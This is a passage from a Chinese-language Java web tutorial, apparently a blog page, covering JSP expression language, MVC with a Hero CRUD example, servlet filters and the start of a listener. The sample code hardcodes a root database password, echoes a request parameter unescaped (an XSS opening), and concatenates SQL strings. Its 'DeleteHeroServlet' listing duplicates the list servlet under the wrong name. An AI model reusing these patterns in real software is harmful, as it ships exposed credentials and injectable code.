class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">    pageEncoding=<span class="string">&quot;UTF-8&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> isELIgnored=<span class="string">&quot;false&quot;</span>%&gt;</span><br><span class="line"> </span><br><span class="line">$&#123;param.name&#125;</span><br></pre></td></tr></table></figure><h1 id="0x05-MVC框架"><a href="#0x05-MVC框架" class="headerlink" title="0x05 MVC框架"></a>0x05 MVC框架</h1><p><img src="https://image.v0w.top/2020/12/16091321478240.jpg" alt="早期架构"><br>仅仅使用Servlet缺点：</p><ul><li>Servlet不仅要准备数据，还要准备html。 尤其是准备html，可读性非常差，维护起来也很麻烦</li></ul><p>仅仅使用jsp缺点：</p><ul><li>虽然编写html方便了，但是写java代码不如在Servlet中那么方便</li></ul><p>结合Serlvet和JSP进行数据的显示，就是一种MVC的思想。</p><ul><li>M 代表 模型（Model）</li><li>V 代表 视图（View）</li><li>C 代表 控制器（controller)</li></ul><p>模型是什么呢？ 模型就是数据，就是dao,bean<br>视图是什么呢？ 就是网页, JSP，用来展示模型中的数据<br>控制器是什么？ 控制器用来把不同的数据，显示在不同的视图上。 在这个例子的，Servlet就是充当控制器的角色，把Hero对象，显示在JSP上。</p><p>控制器的作用就是把不同的数据(Model)，显示在不同的视图(View)上。</p><ul><li>Model<ul><li>业务逻辑层（Service）</li><li>数据持久层CRUD(DAO）</li></ul></li><li>View<ul><li>显示数据</li><li>提供链接，发起Servlet请求</li></ul></li><li>Controller<ul><li>接受用户请求（req用户请求，Session信息…）</li><li>交给业务层处理对应的代码</li><li>控制试图的跳转</li></ul></li></ul><p><img src="https://image.v0w.top/2020/12/16091323691808.jpg" alt="MVC框架"></p><p>实现一个CRUD操作数据库Hero的小项目：<br>文件结构：<br><img src="https://image.v0w.top/2020/12/16091502187670.jpg" alt="Structure"></p><p>bean.Hero</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hero</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">float</span> hp;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> damage;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">float</span> <span class="title">getHp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setHp</span><span class="params">(<span class="keyword">float</span> hp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.hp = hp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDamage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> damage;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDamage</span><span class="params">(<span class="keyword">int</span> damage)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.damage = damage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dao.HeroDAO(也是copy how2j的代码)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> top.v0w.bean.Hero;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeroDAO</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HeroDAO</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://127.0.0.1:3306/how2j?characterEncoding=UTF-8&quot;</span>, <span class="string">&quot;root&quot;</span>,</span><br><span class="line">                <span class="string">&quot;V0Wldl.n1ub1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getTotal</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">try</span> (Connection c = getConnection(); Statement s = c.createStatement();) &#123;</span><br><span class="line"></span><br><span class="line">            String sql = <span class="string">&quot;select count(*) from hero&quot;</span>;</span><br><span class="line"></span><br><span class="line">            ResultSet rs = s.executeQuery(sql);</span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                total = rs.getInt(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;total:&quot;</span> + total);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> total;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Hero hero)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String sql = <span class="string">&quot;insert into hero values(null,?,?,?)&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (Connection c = getConnection(); PreparedStatement ps = c.prepareStatement(sql);) &#123;</span><br><span class="line"></span><br><span class="line">            ps.setString(<span class="number">1</span>, hero.name);</span><br><span class="line">            ps.setFloat(<span class="number">2</span>, hero.hp);</span><br><span class="line">            ps.setInt(<span class="number">3</span>, hero.damage);</span><br><span class="line"></span><br><span class="line">            ps.execute();</span><br><span class="line"></span><br><span class="line">            ResultSet rs = ps.getGeneratedKeys();</span><br><span class="line">            <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">                <span class="keyword">int</span> id = rs.getInt(<span class="number">1</span>);</span><br><span class="line">                hero.id = id;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(Hero hero)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String sql = <span class="string">&quot;update hero set name= ?, hp = ? , damage = ? where id = ?&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (Connection c = getConnection(); PreparedStatement ps = c.prepareStatement(sql);) &#123;</span><br><span class="line"></span><br><span class="line">            ps.setString(<span class="number">1</span>, hero.name);</span><br><span class="line">            ps.setFloat(<span class="number">2</span>, hero.hp);</span><br><span class="line">            ps.setInt(<span class="number">3</span>, hero.damage);</span><br><span class="line">            ps.setInt(<span class="number">4</span>, hero.id);</span><br><span class="line"></span><br><span class="line">            ps.execute();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (Connection c = getConnection(); Statement s = c.createStatement();) &#123;</span><br><span class="line"></span><br><span class="line">            String sql = <span class="string">&quot;delete from hero where id = &quot;</span> + id;</span><br><span class="line"></span><br><span class="line">            s.execute(sql);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Hero <span class="title">get</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        Hero hero = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (Connection c = getConnection(); Statement s = c.createStatement();) &#123;</span><br><span class="line"></span><br><span class="line">            String sql = <span class="string">&quot;select * from hero where id = &quot;</span> + id;</span><br><span class="line"></span><br><span class="line">            ResultSet rs = s.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">                hero = <span class="keyword">new</span> Hero();</span><br><span class="line">                String name = rs.getString(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">float</span> hp = rs.getFloat(<span class="string">&quot;hp&quot;</span>);</span><br><span class="line">                <span class="keyword">int</span> damage = rs.getInt(<span class="number">4</span>);</span><br><span class="line">                hero.name = name;</span><br><span class="line">                hero.hp = hp;</span><br><span class="line">                hero.damage = damage;</span><br><span class="line">                hero.id = id;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hero;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Hero&gt; <span class="title">list</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> list(<span class="number">0</span>, Short.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Hero&gt; <span class="title">list</span><span class="params">(<span class="keyword">int</span> start, <span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">        List&lt;Hero&gt; heros = <span class="keyword">new</span> ArrayList&lt;Hero&gt;();</span><br><span class="line"></span><br><span class="line">        String sql = <span class="string">&quot;select * from hero order by id desc limit ?,? &quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (Connection c = getConnection(); PreparedStatement ps = c.prepareStatement(sql);) &#123;</span><br><span class="line"></span><br><span class="line">            ps.setInt(<span class="number">1</span>, start);</span><br><span class="line">            ps.setInt(<span class="number">2</span>, count);</span><br><span class="line"></span><br><span class="line">            ResultSet rs = ps.executeQuery();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                Hero hero = <span class="keyword">new</span> Hero();</span><br><span class="line">                <span class="keyword">int</span> id = rs.getInt(<span class="number">1</span>);</span><br><span class="line">                String name = rs.getString(<span class="number">2</span>);</span><br><span class="line">                <span class="keyword">float</span> hp = rs.getFloat(<span class="string">&quot;hp&quot;</span>);</span><br><span class="line">                <span class="keyword">int</span> damage = rs.getInt(<span class="number">4</span>);</span><br><span class="line">                hero.id = id;</span><br><span class="line">                hero.name = name;</span><br><span class="line">                hero.hp = hp;</span><br><span class="line">                hero.damage = damage;</span><br><span class="line">                heros.add(hero);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> heros;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filter.CharEncodingFilter</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CharEncodingFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>servlet.ListHeroServlet</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> top.v0w.bean.Hero;</span><br><span class="line"><span class="keyword">import</span> top.v0w.dao.HeroDAO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeroListServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        List&lt;Hero&gt; heros = <span class="keyword">new</span> HeroDAO().list();</span><br><span class="line">        request.setAttribute(<span class="string">&quot;heros&quot;</span>, heros);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">&quot;listHero.jsp&quot;</span>).forward(request, response);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>servlet.DeleteHeroServlet</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> top.v0w.bean.Hero;</span><br><span class="line"><span class="keyword">import</span> top.v0w.dao.HeroDAO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeroListServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        List&lt;Hero&gt; heros = <span class="keyword">new</span> HeroDAO().list();</span><br><span class="line">        request.setAttribute(<span class="string">&quot;heros&quot;</span>, heros);</span><br><span class="line">        request.getRequestDispatcher(<span class="string">&quot;listHero.jsp&quot;</span>).forward(request, response);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>webapp/listHero.jsp</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span></span><br><span class="line">         pageEncoding=<span class="string">&quot;UTF-8&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> prefix=<span class="string">&quot;c&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;table align=<span class="string">&#x27;center&#x27;</span> border=<span class="string">&#x27;1&#x27;</span> cellspacing=<span class="string">&#x27;0&#x27;</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;id&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;name&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;hp&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;damage&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;edit&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;delete&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;c:forEach items=<span class="string">&quot;$&#123;heros&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;hero&quot;</span> varStatus=<span class="string">&quot;st&quot;</span>&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;$&#123;hero.id&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;hero.name&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;hero.hp&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;hero.damage&#125;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=&quot;editHero?id=$&#123;hero.id&#125;&quot;&gt;edit&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=&quot;deleteHero?id=$&#123;hero.id&#125;&quot;&gt;delete&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">    &lt;/c:forEach&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure><p>web.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span></span><br><span class="line"><span class="tag"><span class="string">                  http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">metadata-complete</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HeroListServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>top.v0w.servlet.HeroListServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HeroListServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/listHero<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HeroDeleteServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>top.v0w.servlet.HeroDeleteServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HeroDeleteServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/deleteHero<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharEncodingFiler<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>top.v0w.filter.CharEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharEncodingFiler<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x06-Filter"><a href="#0x06-Filter" class="headerlink" title="0x06 Filter"></a>0x06 Filter</h1><p>Filter就像一个一个哨卡，用户的请求需要经过Filter。并且可以有多个过滤器：</p><p><img src="https://image.v0w.top/2020/12/16091330778625.jpg" alt="过滤器"><br>自己编写的Filter需要实现<code>javax.servlet.Filter</code>接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CharactorEncodingFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始化: web服务器启动时，进行初始化</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;过滤器初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实际过滤器</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;chain 执行前&quot;</span>);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">        System.out.println(<span class="string">&quot;chain 执行后&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁: web服务器关闭时，才销毁</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;过滤器销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web.xml进行过滤器的注册</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharEncodingFiler<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>top.v0w.filter.CharactorEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharEncodingFiler<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/show<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="0x07-Listener-监听器"><a href="#0x07-Listener-监听器" class="headerlink" title="0x07 Listener 监听器"></a>0x07 Listener 监听器</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.v0w.listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSessionListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OnlineCountListener</span> <span class="keyword">implements</span> <span class="title">HttpSessionListener</span> </span>&#123;</span><br><span class="line">    <span 